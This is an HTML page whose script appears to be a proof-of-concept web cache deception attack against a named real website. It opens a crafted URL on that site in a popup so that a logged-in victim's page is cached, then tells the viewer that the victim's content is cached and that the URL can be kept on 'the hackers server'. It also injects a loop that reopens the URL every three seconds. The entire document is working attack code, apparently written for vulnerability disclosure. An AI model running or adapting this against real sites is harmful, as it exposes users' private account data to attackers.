<head>
</head>
<body>
<script>
   var cachedUrl = 'https://m.mobile.de/vip_cache_poisoning_poc.js';
   var popup = window.open(cachedUrl);
   var checker = setInterval(function() {
       if (popup.closed) {
           clearInterval(checker);
       }
   }, 200);
   var closer = setInterval(function() {
       popup.close();
       document.body.innerHTML = 'Victims content is now cached <a href="' + cachedUrl + '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' + cachedUrl + '</b>';
        var script  = document.createElement("script");
        script.text = 'function openAndCloseWindow(url) {var newWindow = window.open(url); setTimeout(function() {newWindow.close();}, 3000);}; function openWindowsContinuously() {setInterval(function() {openAndCloseWindow("' + cachedUrl + '");}, 3000);}; openWindowsContinuously()';
        document.body.appendChild(script);
       clearInterval(closer);
   }, 1000);
    
</script>
</body>
</html>
